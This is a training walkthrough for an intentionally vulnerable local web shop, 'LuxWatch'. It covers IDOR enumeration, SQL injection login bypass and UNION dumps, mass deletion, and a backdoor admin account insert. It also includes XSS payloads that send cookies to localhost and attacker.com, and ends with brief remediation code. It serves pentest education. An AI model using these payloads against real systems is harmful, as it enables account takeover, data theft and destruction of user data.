# 🎯 LuxWatch - Attack Scenarios

Complete attack walkthrough scenarios for demonstrating web attack chaining and penetration testing techniques using Burpsuite.

---

## 📋 Table of Contents

1. [Setup Requirements](#setup-requirements)
2. [Scenario 1: IDOR - Address Enumeration](#scenario-1-idor---address-enumeration)
3. [Scenario 2: Payment Card Data Breach](#scenario-2-payment-card-data-breach)
4. [Scenario 3: Private Collection Access](#scenario-3-private-collection-access)
5. [Scenario 4: Referral Program Exploitation](#scenario-4-referral-program-exploitation)
6. [Scenario 5: Order Tracking Intelligence](#scenario-5-order-tracking-intelligence)
7. [Scenario 6: SQL Injection Authentication Bypass](#scenario-6-sql-injection-authentication-bypass)
8. [Scenario 7: UNION-Based Data Exfiltration](#scenario-7-union-based-data-exfiltration)
9. [Scenario 8: XSS Session Hijacking](#scenario-8-xss-session-hijacking)
10. [Scenario 9: IDOR Mass Deletion (DoS)](#scenario-9-idor-mass-deletion-dos)
11. [Scenario 10: Complete Attack Chain](#scenario-10-complete-attack-chain)

---

## Setup Requirements

### Tools Needed
- **Burpsuite Community/Professional Edition**
- **Web Browser** (Firefox recommended)
- **LuxWatch Application** running on localhost:3000

### Initial Setup

1. **Start LuxWatch**
   ```bash
   cd luxwatch
   npm start
   ```

2. **Start Burpsuite**
   ```bash
   java -jar burpsuite.jar
   ```

3. **Configure Browser Proxy**
   - Firefox → Settings → Network Settings
   - Manual proxy configuration
   - HTTP Proxy: `127.0.0.1`, Port: `8080`
   - ✓ Use this proxy server for all protocols

4. **Configure Burpsuite**
   - Proxy → Options → Proxy Listeners
   - Ensure `127.0.0.1:8080` is running
   - Proxy → Intercept → Intercept is on

5. **Test Credentials**
   - User: `user` / `user123` (ID: 2)
   - Admin: `admin` / `admin123` (ID: 1)
   - John: `john` / `password` (ID: 3)

---

## Scenario 1: IDOR - Address Enumeration

**Objective:** Extract all users' shipping addresses from the database

**Vulnerability:** No authorization check on `/api/addresses/:id`

**Impact:** Complete customer PII disclosure, physical addresses for social engineering

### Step-by-Step Attack

#### Step 1: Login
1. Navigate to http://localhost:3000
2. Click "Login"
3. Enter credentials: `user` / `user123`
4. Click "Login"

#### Step 2: Navigate to Addresses
1. Click "Dashboard" in navigation
2. Click "Addresses" in sidebar
3. Observe your saved address appears

#### Step 3: Intercept Request
1. In Burpsuite: **Proxy → Intercept → Intercept is on**
2. In browser: Click "Edit" button on your address
3. Burpsuite intercepts the request

#### Step 4: Observe Normal Request
```http
GET /api/addresses/2 HTTP/1.1
Host: localhost:3000
Cookie: session=2_1769705742000
```

Note: ID `2` corresponds to current user

#### Step 5: Exploit IDOR
1. **Change** the ID from `2` to `1`
2. Modified request:
   ```http
   GET /api/addresses/1 HTTP/1.1
   Host: localhost:3000
   Cookie: session=2_1769705742000
   ```
3. Click "Forward"

#### Step 6: View Unauthorized Data
Response shows admin's address:
```json
{
  "id": 1,
  "user_id": 1,
  "name": "Admin Office",
  "street": "123 Luxury Ave",
  "city": "New York",
  "state": "NY",
  "zip": "10001",
  "country": "USA",
  "is_default": 1
}
```

✅ **Success:** Accessed admin's address without authorization!

### Automated Enumeration with Intruder

#### Step 1: Send to Intruder
1. Right-click intercepted request
2. "Send to Intruder"

#### Step 2: Configure Attack
1. Intruder → Positions
2. Attack type: **Sniper**
3. Clear all positions (§ markers)
4. Select the ID value: `/api/addresses/2`
5. Click "Add §" to mark: `/api/addresses/§2§`

#### Step 3: Set Payload
1. Intruder → Payloads
2. Payload type: **Numbers**
3. From: `1`
4. To: `100`
5. Step: `1`

#### Step 4: Start Attack
1. Click "Start attack"
2. Monitor responses
3. Filter by: Status codes `200` (successful)

#### Step 5: Extract Data
Results show all addresses:
- ID 1: Admin Office, New York
- ID 2: Home, Los Angeles
- ID 3: Office, Chicago
- ...

**Total Impact:** Complete database dump of all customer addresses

---

## Scenario 2: Payment Card Data Breach

**Objective:** Extract all users' saved payment methods

**Vulnerability:** `/api/payment-methods/:id` has no ownership validation

**Impact:** PCI DSS violation, payment card data exposure

### Attack Steps

#### Step 1: Discover Payment Method IDs
1. Login as `user`
2. Go to Dashboard → Payment Methods
3. Open browser DevTools (F12)
4. Network tab
5. Observe: `GET /api/user/payment-methods`
6. Response shows your payment methods with IDs

#### Step 2: Test IDOR
1. Intercept: `GET /api/payment-methods/2` (your card)
2. **Change to:** `GET /api/payment-methods/1`
3. Forward

#### Step 3: View Admin's Card
```json
{
  "id": 1,
  "user_id": 1,
  "card_type": "Visa",
  "last_four": "4532",
  "expiry_month": 12,
  "expiry_year": 2027,
  "is_default": 1
}
```

### Mass Enumeration

**Burpsuite Intruder Configuration:**
```http
GET /api/payment-methods/§1§ HTTP/1.1
Host: localhost:3000
Cookie: session=2_1769705742000
```

**Payload:** Numbers 1-100

**Extract:**
- Grep - Extract: `"card_type":`
- Grep - Extract: `"last_four":`
- Filter: Status 200 (valid cards)

**Results:**
```
ID 1: Visa ****4532, Exp: 12/2027
ID 2: Mastercard ****8765, Exp: 6/2026
ID 3: Amex ****1234, Exp: 3/2028
```

---

## Scenario 3: Private Collection Access

**Objective:** View competitors' private watch collections

**Vulnerability:** `/api/collections/:id` returns private collections without authorization

**Impact:** Business intelligence, competitive advantage, privacy breach

### Attack Demonstration

#### Step 1: Understand Collections
- Users can create collections of watches they're interested in
- Collections can be marked as **private** (`is_public=0`)
- Private collections should only be visible to the owner

#### Step 2: View Your Own Collection
1. Login as `user` (ID: 2)
2. Go to Dashboard → Collections
3. Click "View" on "Dream Watches"
4. Observe request: `GET /api/collections/2`

Response:
```json
{
  "id": 2,
  "user_id": 2,
  "name": "Dream Watches",
  "description": "Watches I want to own someday",
  "is_public": 0,
  "username": "user",
  "items": [...]
}
```

#### Step 3: Access Private Collection
1. Intercept: `GET /api/collections/2`
2. **Change to:** `GET /api/collections/3` (belongs to john)
3. Forward

Response shows john's **private** collection:
```json
{
  "id": 3,
  "user_id": 3,
  "name": "Investment Pieces",
  "description": "High-value watches for investment",
  "is_public": 0,
  "username": "john",
  "items": [
    {
      "id": 1,
      "product_id": 3,
      "name": "Patek Philippe Nautilus",
      "brand": "Patek Philippe",
      "price": 35000,
      "image": "patek-nautilus.jpg"
    },
    {
      "id": 2,
      "product_id": 4,
      "name": "Audemars Piguet Royal Oak",
      "brand": "Audemars Piguet",
      "price": 28000,
      "image": "ap-royaloak.jpg"
    }
  ]
}
```

**Business Intelligence Gained:**
- Competitor is interested in ultra-luxury timepieces
- Focus on Patek Philippe and Audemars Piguet
- Price range: $28K-$35K
- Investment-focused buyer

---

## Scenario 4: Referral Program Exploitation

**Objective:** Steal referral codes and view earnings

**Vulnerability:** `/api/referrals/:userId` accessible by any authenticated user

**Impact:** Financial fraud, revenue theft

### Attack Flow

#### Step 1: View Own Referral Stats
1. Login as `user` (ID: 2)
2. Go to Dashboard → Referrals
3. Observe your referral code and earnings

#### Step 2: Intercept API Call
1. Burpsuite Intercept ON
2. Reload Referrals page
3. Intercepted: `GET /api/referrals/2`

Response:
```json
{
  "total_referrals": 0,
  "total_earnings": 75.25,
  "referral_code": "USER2024"
}
```

#### Step 3: Enumerate All Users
1. **Change to:** `GET /api/referrals/1` (admin)
2. Forward

Response:
```json
{
  "total_referrals": 1,
  "total_earnings": 150.50,
  "referral_code": "ADMIN2024"
}
```

### Exploitation Techniques

**1. Code Theft**
- Steal high-performing referral codes
- Use codes for new signups
- Get credit for others' referrals

**2. Earnings Intelligence**
- Map user IDs to earnings
- Identify top affiliates
- Target high earners for social engineering

**3. Automated Sweep**
```http
GET /api/referrals/§1§ HTTP/1.1
```
Payload: 1-100

Extract all referral codes and earnings.

---

## Scenario 5: Order Tracking Intelligence

**Objective:** Track any user's orders and shipping locations

**Vulnerability:** `/api/orders/:id/tracking` has no ownership check

**Impact:** Customer PII, real-time location tracking, business intelligence

### Attack Steps

#### Step 1: Place Sample Order
1. Login as `user`
2. Browse products
3. Place order (gets Order ID: 1)

#### Step 2: View Own Tracking
1. Go to Dashboard → My Orders
2. Click "Track" on your order
3. Observe: `GET /api/orders/1/tracking`

Response:
```json
{
  "order": {
    "id": 1,
    "user_id": 2,
    "product_id": 1,
    "quantity": 1,
    "total_price": 12500.00,
    "status": "shipped"
  },
  "tracking": [
    {
      "id": 1,
      "order_id": 1,
      "status": "Shipped",
      "location": "Los Angeles Distribution Center",
      "notes": "Package in transit",
      "updated_at": "2024-01-29"
    }
  ]
}
```

#### Step 3: Track Competitor Orders
1. Intercept tracking request
2. **Change to:** `GET /api/orders/2/tracking`
3. Forward

Response shows john's order:
```json
{
  "order": {
    "id": 2,
    "user_id": 3,
    "product_id": 5,
    "total_price": 4500.00,
    "status": "delivered"
  },
  "tracking": [
    {
      "status": "Delivered",
      "location": "Chicago - 789 Business Blvd",
      "notes": "Delivered to recipient",
      "updated_at": "2024-01-29"
    }
  ]
}
```

**Intelligence Extracted:**
- Shipping address: Chicago, 789 Business Blvd
- Product purchased: Tag Heuer Carrera ($4500)
- Delivery confirmed
- Customer profile: Mid-range luxury buyer

### Business Intelligence Attack

**Enumerate all orders:**
```http
GET /api/orders/§1§/tracking HTTP/1.1
```

**Analysis:**
- Sales volume estimation
- Popular products
- Geographic distribution
- Customer purchasing power
- Delivery success rate

---

## Scenario 6: SQL Injection Authentication Bypass

**Objective:** Bypass login without knowing password

**Vulnerability:** Login query concatenates user input

**Impact:** Complete authentication bypass, admin access

### Attack Execution

#### Step 1: Attempt Normal Login
1. Go to login page
2. Username: `admin`
3. Password: `test123`
4. Result: "Invalid credentials"

#### Step 2: SQL Injection Payload
1. Username: `admin' OR '1'='1' --`
2. Password: `anything`
3. Click "Login"

#### Step 3: Understand the Exploit

**Vulnerable Query:**
```sql
SELECT * FROM users 
WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'
```

**Executed Query (after injection):**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

**Result:** Returns all users (or first user if LIMIT applied)

✅ **Logged in as admin** without knowing the password!

### Alternative Payloads

**1. Comment-based bypass:**
```
Username: admin' --
Password: [empty]
```

**2. Boolean-based:**
```
Username: ' OR 1=1 --
Password: [anything]
```

**3. Specific user targeting:**
```
Username: admin' AND '1'='1
Password: [anything]
```

---

## Scenario 7: UNION-Based Data Exfiltration

**Objective:** Extract entire user database via search

**Vulnerability:** Search query vulnerable to UNION injection

**Impact:** Complete database dump

### Attack Steps

#### Step 1: Test Search Functionality
1. Go to homepage
2. Search for: `Rolex`
3. Observe results display products

#### Step 2: Column Count Detection
1. Search: `Rolex' ORDER BY 1 --`
2. If successful, try: `Rolex' ORDER BY 2 --`
3. Continue until error
4. Determines number of columns in SELECT

#### Step 3: UNION Injection
1. Search payload:
```sql
' UNION SELECT id, username, password, email, role, created_at FROM users --
```

Full query becomes:
```sql
SELECT * FROM products 
WHERE name LIKE '%' UNION SELECT id, username, password, email, role, created_at FROM users --%'
```

#### Step 4: Extract Data
Products page now displays user accounts as "products":

```
Product 1: admin
Description: admin123
Price: admin@luxwatches.com
Brand: admin

Product 2: user
Description: user123
Price: user@example.com
Brand: user

Product 3: john
Description: password
Price: john@example.com
Brand: user
```

**All passwords exposed in plain text!**

### Advanced Exfiltration

**Extract addresses:**
```sql
' UNION SELECT id, name, street, city, state, zip FROM addresses --
```

**Extract payment methods:**
```sql
' UNION SELECT id, card_type, last_four, expiry_month, expiry_year, user_id FROM payment_methods --
```

---

## Scenario 8: XSS Session Hijacking

**Objective:** Steal admin session cookie via XSS

**Vulnerability:** Product reviews display without sanitization

**Impact:** Account takeover, session hijacking

### Attack Setup

#### Step 1: Setup Attacker Server
```bash
# Simple HTTP server to receive stolen cookies
python3 -m http.server 8888
```

Listens on http://localhost:8888

#### Step 2: Craft XSS Payload
```javascript
<script>
fetch('http://localhost:8888/steal?cookie=' + document.cookie);
</script>
```

#### Step 3: Inject Payload
1. Login as `user`
2. View any product (e.g., Rolex Submariner)
3. Write a review
4. Rating: 5 stars
5. Comment: `<script>fetch('http://localhost:8888/steal?cookie=' + document.cookie);</script>`
6. Submit review

#### Step 4: Wait for Admin
1. Admin logs in
2. Views product page
3. XSS payload executes in admin's browser
4. Admin's cookie sent to attacker server

#### Step 5: Hijack Session
Attacker server receives:
```
GET /steal?cookie=session=1_1769705742000 HTTP/1.1
```

1. Copy admin's session token: `1_1769705742000`
2. In your browser DevTools:
   ```javascript
   document.cookie = "session=1_1769705742000";
   ```
3. Reload page
4. **Now logged in as admin!**

### Alternative XSS Payloads

**Image-based:**
```html
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

**Redirect-based:**
```html
<script>window.location='http://attacker.com/?c='+document.cookie</script>
```

---

## Scenario 9: IDOR Mass Deletion (DoS)

**Objective:** Delete other users' data to cause denial of service

**Vulnerability:** DELETE endpoints have no authorization

**Impact:** Data loss, service disruption

### Attack Demonstration

#### Step 1: Delete Admin's Address
1. Login as `user` (ID: 2)
2. Intercept any DELETE request (e.g., your own address)
3. **Change to:** `DELETE /api/addresses/1`
4. Forward

Result: Admin's address deleted

**Impact:** Admin cannot checkout (no shipping address)

#### Step 2: Delete Payment Methods
```http
DELETE /api/payment-methods/1 HTTP/1.1
Cookie: session=2_1769705742000
```

Result: Admin's payment method deleted

**Impact:** Admin cannot make purchases

#### Step 3: Delete Collections
```http
DELETE /api/collections/1 HTTP/1.1
```

Result: Admin's watch collection permanently deleted

**Impact:** Data loss, user frustration

### Mass Deletion Attack

**Burpsuite Intruder:**
```http
DELETE /api/addresses/§1§ HTTP/1.1
```

Payload: 1-100

**Result:** All addresses in database deleted → Complete DoS

---

## Scenario 10: Complete Attack Chain

**Objective:** Full system compromise using multiple vulnerabilities

**Attack Flow:** SQLi → Admin Access → IDOR → Database Dump

### Phase 1: Initial Access (SQLi)

#### Step 1: Bypass Authentication
1. Login page
2. Username: `admin' OR '1'='1' --`
3. Password: `anything`
4. **Result:** Logged in as admin

### Phase 2: Privilege Escalation

#### Step 2: Access Admin Panel
1. Navigate to `/admin.html`
2. Admin dashboard loads
3. Access to:
   - User management
   - Product management
   - **SQL debug console**

### Phase 3: Database Enumeration

#### Step 3: Use SQL Debug Console
1. Go to Admin → Debug tab
2. Execute: `SELECT * FROM users`

Response:
```json
[
  {"id": 1, "username": "admin", "password": "admin123", "email": "admin@luxwatches.com", "role": "admin"},
  {"id": 2, "username": "user", "password": "user123", "email": "user@example.com", "role": "user"},
  {"id": 3, "username": "john", "password": "password", "email": "john@example.com", "role": "user"}
]
```

#### Step 4: Enumerate All Tables
```sql
SELECT name FROM sqlite_master WHERE type='table'
```

Results:
```
users
products
orders
addresses
payment_methods
collections
wishlists
referrals
order_tracking
```

### Phase 4: Complete Data Exfiltration

#### Step 5: Extract All Data

**Addresses:**
```sql
SELECT * FROM addresses
```

**Payment Methods:**
```sql
SELECT * FROM payment_methods
```

**Orders with user info:**
```sql
SELECT o.*, u.username, u.email, p.name as product_name 
FROM orders o 
JOIN users u ON o.user_id = u.id 
JOIN products p ON o.product_id = p.id
```

**Referral earnings:**
```sql
SELECT * FROM referrals ORDER BY earnings DESC
```

### Phase 5: IDOR-Based Validation

#### Step 6: Verify via IDOR
Use IDOR endpoints to cross-validate:
- `/api/users/1` → User details
- `/api/addresses/1` → Addresses
- `/api/payment-methods/1` → Payment info
- `/api/orders/1/tracking` → Order tracking

### Phase 7: Persistence

#### Step 7: Create Backdoor Account
```sql
INSERT INTO users (username, password, email, role) 
VALUES ('backdoor', 'secret123', 'backdoor@hack.com', 'admin')
```

Result: Persistent admin access even if original account is secured

---

**Complete compromise achieved:**
✅ Authentication bypassed
✅ Admin access gained
✅ Complete database dumped
✅ All customer PII extracted
✅ Backdoor account created
✅ Persistent access established

---

## 🛡️ Remediation Summary

For each vulnerability, the fix involves:

1. **IDOR:** Add ownership checks
   ```javascript
   if (resource.user_id !== req.user.id) {
       return res.status(404).json({ error: 'Not found' });
   }
   ```

2. **SQL Injection:** Use parameterized queries
   ```javascript
   db.get('SELECT * FROM users WHERE username = ?', [username], callback);
   ```

3. **XSS:** Sanitize and encode output
   ```javascript
   const sanitized = escapeHtml(userInput);
   ```

4. **CSRF:** Implement CSRF tokens
   ```javascript
   const csrfToken = generateToken();
   validateCSRF(req.body.csrf_token, req.session.csrf_token);
   ```

---

**These scenarios demonstrate real-world attack techniques in a legal, controlled environment. Use responsibly for education only! 🎓**
